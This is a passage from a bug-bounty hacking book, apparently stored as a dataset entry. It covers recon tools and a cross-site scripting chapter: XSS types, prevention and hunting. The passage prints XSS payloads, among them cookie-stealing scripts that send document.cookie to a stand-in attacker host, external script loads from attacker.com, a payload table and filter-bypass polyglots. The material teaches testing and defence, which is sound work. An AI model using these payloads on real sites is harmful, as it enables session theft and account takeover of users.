https://github.com/\nlanmaster53/recon-ng-marketplace/wiki/API-Keys/.\nStart Hacking!\nNow that you’ve conducted extensive reconnaissance, what should you do\nwith the data you’ve collected? Plan your attacks by using the information\nyou’ve gathered! Prioritize your tests based on the functionality of the appli-\ncation and its technology.\nFor example, if you find a feature that processes credit card numbers, you\ncould first look for vulnerabilities that might leak the credit card numbers,\nsuch as IDORs (Chapter 10). Focus on sensitive features such as credit cards\nand passwords, because these features are more likely to contain critical vul-\nnerabilities. During your recon, you should be able to get a good idea of what\nthe company cares about and the sensitive data it’s protecting. Go after those\nspecific pieces of information throughout your bug-hunting process to maxi-\nmize the business impact of the issues you discover. You can also focus your\nsearch on bugs or vulnerabilities that affect that particular tech stack you\nuncovered, or on elements of the source code you were able to find.\nAnd don’t forget, recon isn’t a one-time activity. You should continue\nto monitor your targets for changes. Organizations modify their system,\ntechnologies, and codebase constantly, so continuous recon will ensure that\nyou always know what the attack surface looks like. Using a combination of\nbash, scheduling tools, and alerting tools, build a recon engine that does\nmost of the work for you.\n104 Chapter 5\nTools Mentioned in This Chapter\nIn this chapter, I introduced many tools you can use in your recon process.\nMany more good tools are out there. The ones mentioned here are merely\nmy personal preferences. I’ve included them here in chronological order\nfor your reference.\nBe sure to learn about how these tools work before you use them!\nUnderstanding the software you use allows you to customize it to fit your\nworkflow.\nScope Discovery\nWHOIS looks for the owner of a domain or IP.\nViewDNS.info reverse WHOIS (https://viewdns.info/reversewhois/) is a tool\nthat searches for reverse WHOIS data by using a keyword.\nnslookup queries internet name servers for IP information about a host.\nViewDNS reverse IP (https://viewdns.info/reverseip/) looks for domains\nhosted on the same server, given an IP or domain.\ncrt.sh (https://crt.sh/), Censys (https://censys.io/), and Cert Spotter (https://\nsslmate.com/certspotter/) are platforms you can use to find certificate\ninformation about a domain.\nSublist3r (https://github.com/aboul3la/Sublist3r/), SubBrute (https://github\n.com/TheRook/subbrute/), Amass (https://github.com/OWASP/Amass/), and\nGobuster (https://github.com/OJ/gobuster/) enumerate subdomains.\nDaniel Miessler’s SecLists (https://github.com/danielmiessler/SecLists/) is a\nlist of keywords that can be used during various phases of recon and\nhacking. For example, it contains lists that can be used to brute-force\nsubdomains and filepaths.\nCommonspeak2 (https://github.com/assetnote/commonspeak2/) generates\nlists that can be used to brute-force subdomains and filepaths using\npublicly available data.\nAltdns (https://github.com/infosec-au/altdns) brute-forces subdomains by\nusing permutations of common subdomain names.\nNmap (https://nmap.org/) and Masscan (https://github.com/robertdavidgraham/\nmasscan/) scan the target for open ports.\nShodan (https://www.shodan.io/), Censys (https://censys.io/), and Project\nSonar (https://www.rapid7.com/research/project-sonar/) can be used to find\nservices on targets without actively scanning them.\nDirsearch (https://github.com/maurosoria/dirsearch/) and Gobuster (https://\ngithub.com/OJ/gobuster) are directory brute-forcers used to find hidden\nfilepaths.\nEyeWitness (https://github.com/FortyNorthSecurity/EyeWitness/) and Snapper\n(https://github.com/dxa4481/Snapper/) grab screenshots of a list of URLs.\nThey can be used to quickly scan for interesting pages among a list of\nenumerated paths.\nWeb Hacking Reconnaissance 105\nOWASP ZAP (https://owasp.org/www-project-zap/) is a security tool that\nincludes a scanner, proxy, and much more. Its web spider can be used\nto discover content on a web server.\nGrayhatWarfare (https://buckets.grayhatwarfare.com/) is an online search\nengine you can use to find public Amazon S3 buckets.\nLazys3 (https://github.com/nahamsec/lazys3/) and Bucket Stream (https://\ngithub.com/eth0izzle/bucket-stream/) brute-force buckets by using keywords.\nOSINT\nThe Google Hacking Database (https://www.exploit-db.com/google\n-hacking-database/) contains useful Google search terms that fre-\nquently reveal vulnerabilities or sensitive files.\nKeyHacks (https://github.com/streaak/keyhacks/) helps you determine\nwhether a set of credentials is valid and learn how to use them to\naccess the target’s services.\nGitrob (https://github.com/michenriksen/gitrob/) finds potentially sensitive\nfiles that are pushed to public repositories on GitHub.\nTruffleHog (https://github.com/trufflesecurity/truffleHog/) specializes in\nfinding secrets in public GitHub repositories by searching for string\npatterns and high-entropy strings.\nPasteHunter (https://github.com/kevthehermit/PasteHunter/) scans online\npaste sites for sensitive information.\nWayback Machine (https://archive.org/web/) is a digital archive of internet\ncontent. You can use it to find old versions of sites and their files.\nWaybackurls (https://github.com/tomnomnom/waybackurls/) fetches URLs\nfrom the Wayback Machine.\nTech Stack Fingerprinting\nThe CVE database (https://cve.mitre.org/cve/search_cve_list.html) contains\npublicly disclosed vulnerabilities. You can use its website to search for\nvulnerabilities that might affect your target.\nWappalyzer (https://www.wappalyzer.com/) identifies content manage-\nment systems, frameworks, and programming languages used on a site.\nBuiltWith (https://builtwith.com/) is a website that shows you which web\ntechnologies a website is built with.\nStackShare (https://stackshare.io/) is an online platform that allows devel-\nopers to share the tech they use. You can use it to collect information\nabout your target.\nRetire.js (https://retirejs.github.io/retire.js/) detects outdated JavaScript\nlibraries and Node.js packages.\n106 Chapter 5",
    "question": "What is the purpose and process of conducting reconnaissance in web hacking?",
    "summary": "The chapter explains the importance of reconnaissance in web hacking, emphasizing the need to gather information about a target's structure and vulnerabilities. It covers techniques like Google dorking, WHOIS lookups, IP address analysis, certificate parsing, subdomain enumeration, and service discovery. It also discusses how to use tools like Nmap, Dirsearch, and Shodan for efficient recon, and how to automate the process with bash scripts. Additionally, it highlights the use of OSINT methods, such as checking job postings, LinkedIn profiles, and archive sites, to uncover more details about the target. The chapter provides examples of how to write bash scripts for recon, including handling multiple domains, using functions, and generating reports. It also covers advanced scripting concepts like variable handling, conditional statements, and command substitution, along with tips on using APIs for recon tasks. Finally, it suggests using cron jobs to schedule automated recon scans and monitor targets for changes."
  },
  {
    "start": 77,
    "end": 90,
    "text": "Automation\nGit (https://git-scm.com/) is an open sourced version-control system. You\ncan use its git diff command to keep track of file changes.\nYou should now have a solid understanding of how to conduct reconnais-\nsance on a target. Remember to keep extensive notes throughout your recon\nprocess, as the information you collect can really balloon over time. Once\nyou have a solid understanding of how to conduct recon on a target, you can\ntry to leverage recon platforms like Nuclei (https://github.com/projectdiscovery/\nnuclei/) or Intrigue Core (https://github.com/intrigueio/intrigue-core/) to make\nyour recon process more efficient. But when you’re starting out, I recom-\nmend that you do recon manually with individual tools or write your own\nautomated recon scripts to learn about the process.\nWeb Hacking Reconnaissance 107\n6\nCROSS-SITE SCRIPTING\nLet’s start with cross-site scripting (XSS), one\nof the most common bugs reported to bug\nbounty programs. It’s so prevalent that, year\nafter year, it shows up in OWASP’s list of the\ntop 10 vulnerabilities threatening web applications.\nIt’s also HackerOne’s most reported vulnerability,\nwith more than $4 million paid out in 2020 alone.\nAn XSS vulnerability occurs when attackers can execute custom scripts\non a victim’s browser. If an application fails to distinguish between user input\nand the legitimate code that makes up a web page, attackers can inject their\nown code into pages viewed by other users. The victim’s browser will then\nexecute the malicious script, which might steal cookies, leak personal infor-\nmation, change site contents, or redirect the user to a malicious site. These\nmalicious scripts are often JavaScript code but can also be HTML, Flash,\nVBScript, or anything written in a language that the browser can execute.\nIn this chapter, we’ll dive into what XSS vulnerabilities are, how to\nexploit them, and how to bypass common protections. We’ll also discuss\nhow to escalate XSS vulnerabilities when you find one.\nMechanisms\nIn an XSS attack, the attacker injects an executable script into HTML pages\nviewed by the user. This means that to understand XSS, you’ll have to first\nunderstand JavaScript and HTML syntax.\nWeb pages are made up of HTML code whose elements describe the\npage’s structure and contents. For example, an <h1> tag defines a web page’s\nheader, and a <p> tag represents a paragraph of text. The tags use corre-\nsponding closing tags, like </h1> and </p>, to indicate where the contents\nof the element should end. To see how this works, save this code in a file\nnamed test.html:\n<html>\n<h1>Welcome to my web page.</h1>\n<p>Thanks for visiting!</p>\n</html>\nNow open it with your web browser. You can do this by right-clicking\nthe HTML file, clicking Open With, and then selecting your preferred web\nbrowser, like Google Chrome, Mozilla Firefox, or Microsoft Internet Explorer.\nOr you can simply open your web browser and drag the HTML file into the\nbrowser window. You should see a simple web page like Figure 6-1.\nFigure 6-1: Our simple HTML page rendered in a browser\nIn addition to formatting text, HTML lets you embed images with <img>\ntags, create user-input forms with <form> tags, link to external pages with <a>\ntags, and perform many other tasks. A full tutorial on how to write HTML\ncode is beyond the scope of this chapter, but you can use W3School’s tuto-\nrial (https://www.w3schools.com/html/default.asp) as a resource.\nHTML also allows the inclusion of executable scripts within HTML\ndocuments using <script> tags. Websites use these scripts to control client-\nside application logic and make the website interactive. For example, the\nfollowing script generates a Hello! pop-up on the web page:\n<html>\n<script>alert(\"Hello!\");</script>\n<h1>Welcome to my web page!</h1>\n<p>Thanks for visiting!</p>\n</html>\n112 Chapter 6\nScripts like this one that are embedded within an HTML file instead\nof loaded from a separate file are called inline scripts. These scripts are the\ncause of many XSS vulnerabilities. (Besides embedding a script inside the\nHTML page as an inline script, sites can also load JavaScript code as an\nexternal file, like this: <script src=\"URL_OF_EXTERNAL_SCRIPT\"></script>.)\nTo see why, let’s say that our site contains an HTML form that allows\nvisitors to subscribe to a newsletter (Figure 6-2).\nFigure 6-2: Our HTML page with an HTML form\nThe source HTML code of the page looks like this:\n<h1>Welcome to my site.</h1>\n<h3>This is a cybersecurity newsletter that focuses on bug bounty\nnews and write-ups. Please subscribe to my newsletter below to\nreceive new cybersecurity articles in your email inbox.</h3>\n<form action=\"/subscribe\" method=\"post\">\n<label for=\"email\">Email:</label><br>\n<input type=\"text\" id=\"email\" value=\"Please enter your email.\">\n<br><br>\n<input type=\"submit\" value=\"Submit\">\n</form>\nAfter a visitor inputs an email address, the website confirms it by dis-\nplaying it on the screen (Figure 6-3).\nFigure 6-3: The confirmation message after a visitor subscribes to our newsletter\nThe HTML that generates the confirmation message looks like this;\nHTML <b> tags indicate boldface text:\n<p>Thanks! You have subscribed <b>vickie@gmail.com</b> to the newsletter.</p>\nThe page constructs the message by using user input. Now, what if a\nuser decides to input a script instead of an email address in the email form?\nCross-Site Scripting 113\nFor instance, a script that sets the location of a web page will make the\nbrowser redirect to the location specified:\n<script>location=\"http://attacker.com\";</script>\nThe attacker could enter this script into the email form field and click\nSubmit (Figure 6-4).\nFigure 6-4: An attacker can\nenter a script instead of an\nemail in the input field.\nIf the website doesn’t validate or sanitize the user input before con-\nstructing the confirmation message, the page source code would become\nthe following:\n<p>Thanks! You have subscribed <b><script>location=\"http://attacker.com\";</\nscript></b> to the newsletter.</p>\nValidating user input means that the application checks that the user\ninput meets a certain standard—in this case, does not contain malicious\nJavaScript code. Sanitizing user input, on the other hand, means that the\napplication modifies special characters in the input that can be used to\ninterfere with HTML logic before further processing.\nAs a result, the inline script would cause the page to redirect to attacker\n.com. XSS happens when attackers can inject scripts in this manner onto\na page that another user is viewing. The attacker can also use a different\nsyntax to embed malicious code. The src attribute of the HTML <script>\ntag allows you to load JavaScript from an external source. This piece of\nmalicious code will execute the contents of http://attacker.com/xss.js/ on the\nvictim’s browser during an XSS attack:\n<script src=http://attacker.com/xss.js></script>\nThis example isn’t really exploitable, because attackers have no way of\ninjecting the malicious script on other users’ pages. The most they could\ndo is redirect themselves to the malicious page. But let’s say that the site\nalso allows users to subscribe to the newsletter by visiting the URL https://\nsubscribe.example.com?email=SUBSCRIBER_EMAIL. After users visit the URL,\nthey will be automatically subscribed, and the same confirmation will be\nshown on the web page. In this case, attackers can inject the script by trick-\ning users into visiting a malicious URL:\nhttps://subscribe.example.com?email=<script>location=\"http://attacker.com\";</script>\n114 Chapter 6\nSince the malicious script gets incorporated into the page, the victim’s\nbrowser will think the script is part of that site. Then the injected script can\naccess any resources that the browser stores for that site, including cookies\nand session tokens. Attackers can, therefore, use these scripts to steal infor-\nmation and bypass access control. For example, attackers might steal user\ncookies by making the victim’s browser send a request to the attacker’s IP\nwith the victim’s cookie as a URL parameter:\n<script>image = new Image();\nimage.src='http://attacker_server_ip/?c='+document.cookie;</script>\nThis script contains JavaScript code to load an image from the attacker’s\nserver, with the user’s cookies as part of the request. The browser will send\na GET request to the attacker’s IP, with the URL parameter c (for cookie)\ncontaining the user’s document.cookie, which is the victim user’s cookie on\nthe current site. In this way, attackers can use the XSS to steal other users’\ncookies by inspecting incoming requests on their server logs. Note that\nif the session cookie has the HttpOnly flag set, JavaScript will not be able\nto read the cookie, and therefore the attacker will not be able to exfiltrate\nit. Nevertheless, XSS can be used to execute actions on the victim’s behalf,\nmodify the web page the victim is viewing, and read the victim’s sensitive\ninformation, such as CSRF tokens, credit card numbers, and any other\ndetails rendered on their page.\nTypes of XSS\nThere are three kinds of XSS: stored XSS, reflected XSS, and DOM-based\nXSS. The difference between these types is in how the XSS payload travels\nbefore it gets delivered to the victim user. Some XSS flaws also fall into spe-\ncial categories: blind XSS and self-XSS, which we’ll talk about in a bit.\nStored XSS\nStored XSS happens when user input is stored on a server and retrieved\nunsafely. When an application accepts user input without validation, stores\nit in its servers, and then renders it on users’ browsers without sanitization,\nmalicious JavaScript code can make its way into the database and then to\nvictims’ browsers.\nStored XSS is the most severe XSS type that we will discuss in this chap-\nter, because it has the potential of attacking many more users than reflected,\nDOM, or self-XSS. Sometimes during a stored-XSS attack, all the user has to\ndo to become a victim is to view a page with the payload embedded, whereas\nreflected and DOM XSS usually require the user to click a malicious link.\nFinally, self-XSS requires a lot of social engineering to succeed.\nDuring a stored XSS attack, attackers manage to permanently save their\nmalicious scripts on the target application’s servers for others to access. Perhaps\nthey’re able to inject the script in the application’s user database. Or maybe\nthey get it in the server logs, on a message board, or in comment field. Every\ntime users access the stored information, the XSS executes in their browser.\nCross-Site Scripting 115\nFor example, let’s say a comment field on an internet forum is vulner-\nable to XSS. When a user submits a comment to a blog post, that user input\nis not validated or sanitized in any way before it gets rendered to anyone\nwho views that blog post. An attacker can submit a comment with JavaScript\ncode and have that code executed by any user who views that blog post!\nA great proof of concept for XSS is to generate an alert box in the\nbrowser via injected JavaScript code, so let’s give that a try. The JavaScript\ncode alert('XSS by Vickie') will generate a pop-up on the victim’s browser\nthat reads XSS by Vickie:\n<script>alert('XSS by Vickie');</script>\nIf submitted, this message would become embedded on the forum page’s\nHTML code, and the page would be displayed to all the visitors who view that\ncomment:\n<h2>Vickie's message</h2>\n<p>What a great post! Thanks for sharing.</p>\n<h2>Attacker's message</h2>\n<p><script>alert('XSS by Vickie');</script></p>\nFigure 6-5 shows the two messages rendered in a browser.\nFigure 6-5: The HTML page with two messages\nrendered in the browser. You can see that the\nattacker’s message is blank because the browser\ninterprets it as a script instead of text.\nWhen you load this HTML page in your browser, you’ll see the attacker’s\ncomment field displayed as blank. This is because your browser interpreted\n<script>alert('XSS by Vickie');</script> located in the <p> tags as a script, not\nas regular text. You should notice a pop-up window that reads XSS by Vickie.\nEvery time a user views the comment on the forum, their browser will\nexecute the embedded JavaScript. Stored XSS tends to be the most danger-\nous because attackers can attack many victims with a single payload.\nBlind XSS\nBlind XSS vulnerabilities are stored XSS vulnerabilities whose malicious input\nis stored by the server and executed in another part of the application or in\nanother application that you cannot see.\nFor example, let’s say that a page on example.com allows you to send a\nmessage to the site’s support staff. When a user submits a message, that\n116 Chapter 6\ninput is not validated or sanitized in any way before it gets rendered to the\nsite’s admin page. An attacker can submit a message with JavaScript code\nand have that code executed by any admin who views that message.\nThese XSS flaws are harder to detect, since you can’t find them by\nlooking for reflected input in the server’s response, but they can be just as\ndangerous as regular stored XSS vulnerabilities. Often, blind XSS can be\nused to attack administrators, exfiltrate their data, and compromise their\naccounts.\nReflected XSS\nReflected XSS vulnerabilities happen when user input is returned to the user\nwithout being stored in a database. The application takes in user input, pro-\ncesses it server-side, and immediately returns it to the user.\nThe first example I showed, with the email form, involved a reflected\nXSS attack. These issues often happen when the server relies on user input\nto construct pages that display search results or error messages. For example,\nlet’s say a site has a search functionality. The user can input a search term via\na URL parameter, and the page will display a message containing the term\nat the top of the results page. If a user searches abc, the source code for the\nrelated message might look like this:\n<h2>You searched for abc; here are the results!</h2>\nIf the search functionality displays any user-submitted search string on\nthe results page, a search term like the following would cause a script to\nbecome embedded on the results page and executed by the browser:\nhttps://example.com/search?q=<script>alert('XSS by Vickie');</script>\nIf an attacker can trick victims into visiting this URL, the payload will\nbecome embedded in their version of the page, making the victim’s browser\nrun whatever code the attacker would like. Unlike stored XSS, which allows\nattackers to execute code on anyone who accesses their stored resources,\nreflected XSS enables attackers to execute code on the browsers of victims\nwho click their malicious links.\nDOM-Based XSS\nDOM-based XSS is similar to reflected XSS, except that in DOM-based XSS,\nthe user input never leaves the user’s browser. In DOM-based XSS, the\napplication takes in user input, processes it on the victim’s browser, and\nthen returns it to the user.\nThe Document Object Model (DOM) is a model that browsers use to render\na web page. The DOM represents a web page’s structure; it defines the basic\nproperties and behavior of each HTML element, and helps scripts access\nand modify the contents of the page. DOM-based XSS targets a web page’s\nDOM directly: it attacks the client’s local copy of the web page instead\nof going through the server. Attackers are able to attack the DOM when\nCross-Site Scripting 117\na page takes user-supplied data and dynamically alters the DOM based on\nthat input. JavaScript libraries like jQuery are prone to DOM-based XSS\nsince they dynamically alter DOM elements.\nAs in reflected XSS, attackers submit DOM-based XSS payloads via the\nvictim’s user input. Unlike reflected XSS, a DOM-based XSS script doesn’t\nrequire server involvement, because it executes when user input modifies\nthe source code of the page in the browser directly. The XSS script is never\nsent to the server, so the HTTP response from the server won’t change.\nThis might all sound a bit abstract, so let’s consider an example. Say a web-\nsite allows the user to change their locale by submitting it via a URL parameter:\nhttps://example.com?locale=north+america\nThe web page’s client-side code will use this locale to construct a wel-\ncome message whose HTML looks like this:\n<h2>Welcome, user from north america!</h2>\nThe URL parameter isn’t submitted to the server. Instead, it’s used\nlocally, by the user’s browser, to construct a web page by using a client-side\nscript. But if the website doesn’t validate the user-submitted locale param-\neter, an attacker can trick users into visiting a URL like this one:\nhttps://example.com?locale=\n<script>location='http://attacker_server_ip/?c='+document.cookie;</script>\nThe site will embed the payload on the user’s web page, and the victim’s\nbrowser will execute the malicious script.\nDOM XSS may sound a lot like reflected XSS at first. The difference is\nthat the reflected XSS payload gets sent to the server and returned to the\nuser’s browser within an HTTP response. On the other hand, the DOM\nXSS payload is injected onto a page because of client-side code rendering\nuser input in an insecure manner. Although the results of the two attacks\nare similar, the processes of testing for them and protecting against them\nare different.\nThe user input fields that can lead to reflected and DOM-based XSS\naren’t always URL parameters. Sometimes they show up as URL fragments\nor pathnames. URL fragments are strings, located at the end of a URL, that\nbegin with a # character. They are often used to automatically direct users to\na section within a web page or transfer additional information. For example,\nthis is a URL with a fragment that takes the user to the #about_us section of\nthe site’s home page:\nhttps://example.com#about_us\nWe’ll talk more about the components of a URL in Chapter 7. For infor-\nmation about DOM XSS and some example payloads, see the PortSwigger\narticle “DOM-Based XSS” at https://portswigger.net/web-security/cross-site-scripting/\ndom-based/.\n118 Chapter 6\nSelf-XSS\nSelf-XSS attacks require victims to input a malicious payload themselves. To\nperform these, attackers must trick users into doing much more than simply\nviewing a page or browsing to a particular URL.\nFor example, let’s say that a field on a user’s dashboard is vulnerable to\nstored XSS. But since only the victim can see and edit the field, there is no\nway for an attacker to deliver the payload unless the attacker can somehow\ntrick the victim into changing the value of the field into the XSS payload.\nIf you’ve ever seen social media posts or text messages telling you to paste\na piece of code into your browser to “do something cool,” it was probably\nattack code aimed at tricking you into launching self-XSS against yourself.\nAttackers often embed a piece of malicious payload (usually via a shortened\nURL like bitly.com so victims won’t suspect anything) into a complicated-\nlooking piece of code and use social media to fool unsuspecting users into\nattacking themselves.\nIn bug bounties, self-XSS bugs are not usually accepted as valid sub-\nmissions because they require social engineering. Bugs that require social\nengineering, or manipulation of the victims, are not usually accepted in bug\nbounty programs because they are not purely technical issues.\nPrevention\nTo prevent XSS, an application should implement two controls: robust input\nvalidation and contextual output escaping and encoding. Applications\nshould never insert user-submitted data directly into an HTML document—\nincluding, for example, inside <script> tags, HTML tag names, or attri-\nbute names. Instead, the server should validate that user-submitted input\ndoesn’t contain dangerous characters that might influence the way browsers\ninterpret the information on the page. For example, user input containing\nthe string \"<script>\" is a good indicator that the input contains an XSS\npayload. In this case, the server could block the request, or sanitize it by\nremoving or escaping special characters before further processing.\nEscaping refers to the practice of encoding special characters so that\nthey are interpreted literally instead of as a special character by the pro-\ngrams or machines that process the characters. There are different ways of\nencoding a character. Applications will need to encode the user input based\non where it will be embedded. If the user input is inserted into <script>\ntags, it needs to be encoded in JavaScript format. The same goes for input\ninserted into HTML, XML, JSON, and CSS files.\nIn the context of our example, the application needs to encode special\ncharacters into a format used by HTML documents. For example, the left\nand right angle brackets can be encoded into HTML characters &lt and &gt.\nTo prevent XSS, the application should escape characters that have special\nmeaning in HTML, such as the & character, the angle brackets < and >, single\nand double quotes, and the forward-slash character.\nEscaping ensures that browsers won’t misinterpret these characters as\ncode to execute. This is what most modern applications do to prevent XSS.\nCross-Site Scripting 119\nThe application should do this for every piece of user input that will be\nrendered or accessed by a user’s browser. Many modern JavaScript frame-\nworks such as React, Angular 2+, and Vue.js automatically do this for you, so\nmany XSS vulnerabilities can be prevented by choosing the right JavaScript\nframework to use.\nThe prevention of DOM-based XSS requires a different approach. Since\nthe malicious user input won’t pass through the server, sanitizing the data\nthat enters and departs from the server won’t work. Instead, applications\nshould avoid code that rewrites the HTML document based on user input,\nand the application should implement client-side input validation before it is\ninserted into the DOM.\nYou can also take measures to mitigate the impact of XSS flaws if they\ndo happen. First, you can set the HttpOnly flag on sensitive cookies that\nyour site uses. This prevents attackers from stealing those cookies via XSS.\nYou should also implement the Content-Security-Policy HTTP response\nheader. This header lets you restrict how resources such as JavaScript, CSS,\nor images load on your web pages. To prevent XSS, you can instruct the\nbrowser to execute only scripts from a list of sources. For more information\nabout preventing XSS attacks, visit the OWASP XSS prevention cheat sheet,\nhttps://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention\n_Cheat_Sheet.html.\nHunting for XSS\nLook for XSS in places where user input gets rendered on a page. The\nprocess will vary for the different types of XSS, but the central principle\nremains the same: check for reflected user input.\nIn this section, we’ll hunt for XSS in web applications. But it’s impor-\ntant to remember that XSS vulnerabilities can also arise outside normal\nweb applications. You can hunt for XSS in applications that communicate\nvia non-HTTP protocols such as SMTP, SNMP, and DNS. Sometimes com-\nmercial apps such as email apps and other desktop apps receive data from\nthese protocols. If you are interested in these techniques, you can check\nout Offensive Security’s Advanced Web Attacks and Exploitation training:\nhttps://www.offensive-security.com/awae-oswe/.\nBefore you start hunting for any vulnerability, it’s good to have Burp\nSuite or your preferred proxy on standby. Make sure you’ve configured your\nproxy to work with your browser. You can find instructions on how to do\nthat in Chapter 4.\nStep 1: Look for Input Opportunities\nFirst, look for opportunities to submit user input to the target site. If you’re\nattempting stored XSS, search for places where input gets stored by the\nserver and later displayed to the user, including comment fields, user pro-\nfiles, and blog posts. The types of user input that are most often reflected\nback to the user are forms, search boxes, and name and username fields in\nsign-ups.\n120 Chapter 6\nDon’t limit yourself to text input fields, either. Sometimes drop-down\nmenus or numeric fields can allow you to perform XSS, because even if you\ncan’t enter your payload on your browser, your proxy might let you insert\nit directly into the request. To do that, you can turn on your proxy’s traffic\ninterception and modify the request before forwarding it to the server. For\nexample, say a user input field seems to accept only numeric values on the\nweb page, such as the age parameter in this POST request:\nPOST /edit_user_age\n(Post request body)\nage=20\nYou can still attempt to submit an XSS payload by intercepting the\nrequest via a web proxy and changing the input value:\nPOST /edit_user_age\n(Post request body)\nage=<script>alert('XSS by Vickie');</script>\nIn Burp, you can edit the request directly in the Proxy tab (Figure 6-6).\nFigure 6-6: Intercept the outgoing request to edit it before relaying it to the server.\nAfter you’re done editing, click Forward to forward the request to the\nserver (Figure 6-7).\nFigure 6-7: Change the URL post request parameter to your XSS payload.\nIf you’re hoping to find reflected and DOM XSS, look for user input in\nURL parameters, fragments, or pathnames that get displayed to the user.\nA good way to do this is to insert a custom string into each URL parameter\nand check whether it shows up in the returned page. Make this string spe-\ncific enough that you’ll be sure your input caused it if you see it rendered.\nCross-Site Scripting 121\nFor example, I like to use the string \"XSS_BY_VICKIE\". Insert your custom\nstring into every user-input opportunity you can find. Then, when you view\nthe page in the browser, search the page’s source code for it (you can access\na page’s source code by right-clicking a page and selecting View Source) by\nusing your browser’s page-search functionality (usually triggered by press-\ning CTRL-F). This should give you an idea of which user input fields appear\nin the resulting web page.\nStep 2: Insert Payloads\nOnce you’ve identified the user-input opportunities present in an applica-\ntion, you can start entering a test XSS payload at the discovered injection\npoints. The simplest payload to test with is an alert box:\n<script>alert('XSS by Vickie');</script>\nIf the attack succeeds, you should see a pop-up on the page with the\ntext XSS by Vickie.\nBut this payload won’t work in typical web applications, save the most\ndefenseless, because most websites nowadays implement some sort of XSS\nprotection on their input fields. A simple payload like this one is more\nlikely to work on IoT or embedded applications that don’t use the latest\nframeworks. If you are interested in IoT vulnerabilities, check out OWASP’s\nIoTGoat project at https://github.com/OWASP/IoTGoat/. As XSS defenses\nbecome more advanced, the XSS payloads that get around these defenses\ngrow more complex too.\nMore Than a <script> Tag\nInserting <script> tags into victim web pages isn’t the only way to get your\nscripts executed in victim browsers. There are a few other tricks. First, you\ncan change the values of attributes in HTML tags. Some HTML attributes\nallow you to specify a script to run if certain conditions are met. For example,\nthe onload event attribute runs a specific script after the HTML element has\nloaded:\n<img onload=alert('The image has been loaded!') src=\"example.png\">\nSimilarly, the onclick event attribute specifies the script to be executed\nwhen the element is clicked, and onerror specifies the script to run in case\nan error occurs loading the element. If you can insert code into these attri-\nbutes, or even add a new event attribute into an HTML tag, you can create\nan XSS.\nAnother way you can achieve XSS is through special URL schemes, like\njavascript: and data:. The javascript: URL scheme allows you to execute\nJavaScript code specified in the URL. For example, entering this URL will\ncause an alert box with the text XSS by Vickie to appear:\njavascript:alert('XSS by Vickie')\n122 Chapter 6\nThis means that if you make the user load a javascript: URL, you can\nachieve XSS as well. Data URLs, those that use the data: scheme, allow you\nto embed small files in a URL. You can use these to embed JavaScript code\ninto URLs too:\ndata:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTIGJ5IFZpY2tpZScpPC9zY3JpcHQ+\"\nThis URL will also generate an alert box, because the included data in\nthe data URL is the base64-encoded version of the following script:\n<script>alert('XSS by Vickie')</script>\nDocuments contained within data: URLs do not need to be base64\nencoded. For example, you can embed the JavaScript directly in the URL as\nfollows, but base64 encoding can often help you bypass XSS filters:\ndata:text/html,<script>alert('XSS by Vickie')</script>\nYou can utilize these URLs to trigger XSS when a site allows URL input\nfrom users. A site might allow the user to load an image by using a URL and\nuse it as their profile picture, like this:\nhttps://example.com/upload_profile_pic?url=IMAGE_URL\nThe application will then render a preview on the web page by inserting\nthe URL into an <img> tag. If you insert a JavaScript or data URL, you can\ntrick the victim’s browser into loading your JavaScript code:\n<img src=\"IMAGE_URL\"/>\nThere are many more ways to execute JavaScript code to bypass XSS\nprotection. You can find more example payloads on PortSwigger at https://\nportswigger.net/web-security/cross-site-scripting/cheat-sheet/. Different browsers\nalso support different tags and event handlers, so you should always test by\nusing multiple browsers when hunting for XSS.\nClosing Out HTML Tags\nWhen inserting an XSS payload, you’ll often have to close out a previous\nHTML tag by including its closing angle bracket. This is necessary when\nyou’re placing your user input inside one HTML element but want to run\nJavaScript using a different HTML element. You have to complete the pre-\nvious tag before you can start a new one to avoid causing a syntax error.\nOtherwise, the browser won’t interpret your payload correctly. For example,\nif you’re inserting input into an <img> tag, you need to close out the <img>\ntag before you can start a <script> tag. Here is the original <img> tag with a\nplaceholder for user input:\n<img src=\"USER_INPUT\">\nCross-Site Scripting 123\nTo close out the tag, your payload has to include the ending of an <img>\ntag before the JavaScript. The payload might look like this:\n\"/><script>location=\"http://attacker.com\";</script>\nWhen injected into the <img> tag, the resulting HTML will look like this\n(with the injected portion in bold):\n<img src=\"\"/><script>location=\"http://attacker.com\";</script>\">\nThis payload closes the string that was supposed to contain the user\ninput by providing a double quote, then closes the <img> tag with a tag ending\nin />. Finally, the payload injects a complete script tag after the <img> tag.\nIf your payload is not working, you can check whether your payload\ncaused syntax errors in the returned document. You can inspect the returned\ndocument in your proxy and look for unclosed tags or other syntax issues.\nYou can also open your browser’s console and see if the browser runs into any\nerrors loading the page. In Firefox, you can open the console by right-clicking\nthe page and choosing Inspect ElementConsole.\nYou can find more common XSS payloads online. Table 6-1 lists some\nexamples.\nTable 6-1: Common XSS Payloads\nPayload Purpose\n<script>alert(1)</script> This is the most generic XSS payload . It will generate a pop-\nup box if the payload succeeds .\n<iframe src=javascript:alert(1)> This payload loads JavaScript code within an iframe . It’s use-\nful when <script> tags are banned by the XSS filter .\n<body onload=alert(1)> This payload is useful when your input string can’t contain the\nterm script . It inserts an HTML element that will run JavaScript\nautomatically after it’s loaded .\n\"><img src=x onerror=prompt(1);> This payload closes out the previous tag . It then injects an\n<img> tag with an invalid source URL . Once the tag fails\nto load, it will run the JavaScript specified in the onerror\nattribute .\n<script>alert(1)<!– <!- is the start of an HTML comment . This payload will com-\nment out the rest of the line in the HTML document to prevent\nsyntax errors .\n<a onmouseover\"alert(1)\">test</a> This payload inserts a link that will cause JavaScript to exe-\ncute after a user hovers over the link with their cursor .\n<script src=//attacker.com/test.js> This payload causes the browser to load and run an external\nscript hosted on the attacker’s server .\nHackers have designed many more creative payloads. Search XSS pay-\nloads online for more ideas. That said, taking a long list of payloads and\ntrying them one by one can be time-consuming and unproductive. Another\nway of approaching manual XSS testing is to insert an XSS polyglot, a type of\nXSS payload that executes in multiple contexts. For example, it will execute\n124 Chapter 6\nregardless of whether it is inserted into an <img> tag, a <script> tag, or a\ngeneric <p> tag and can bypass some XSS filters. Take a look at this polyglot\npayload published by EdOverflow at https://polyglot.innerht.ml/:\njavascript:\"/*\\\"/*`/*' /*</template>\n</textarea></noembed></noscript></title>\n</style></script>-->&lt;svg onload=/*<html/*/onmouseover=alert()//>\nThe details of this payload are beyond the scope of the book, but it con-\ntains multiple ways of creating an XSS—so if one method fails, another one\ncan still induce the XSS.\nAnother way of testing 